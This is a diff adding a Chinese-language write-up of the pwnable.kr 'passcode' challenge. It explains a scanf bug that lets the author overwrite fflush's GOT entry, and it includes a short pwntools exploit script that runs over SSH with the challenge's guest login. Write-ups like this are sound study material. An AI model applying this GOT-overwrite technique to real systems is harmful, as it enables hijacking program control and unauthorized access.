@@ -35,3 +35,27 @@ int main(){
 	return 0;	
 }
 ```
+
+login()裡面的`scanf("%d", passcode1);`沒有用`&`字號
+
+然後passcode1跟name的位置差96bytes
+
+所以我們可以把4bytes位置塞到passcode1裡面
+
+然後在scanf那邊在輸入我們要的值
+
+於是把頭腦動到`fflush(stdin)`的GOT位置(0x0804a000)
+
+然後在scanf那邊輸入`system("/bin/cat flag")`的指令位置(0x080485E3)
+
+exploit: 
+```python
+from pwn import *
+r = ssh(host='pwnable.kr',user='passcode',password='guest',port=2222).process("./passcode")
+# r = process('./passcode')
+print r.recv()
+r.sendline('a'*96+p32(0x0804a000))
+print r.recv()
+r.sendline(str(0x080485E3))
+print r.recv()
+```
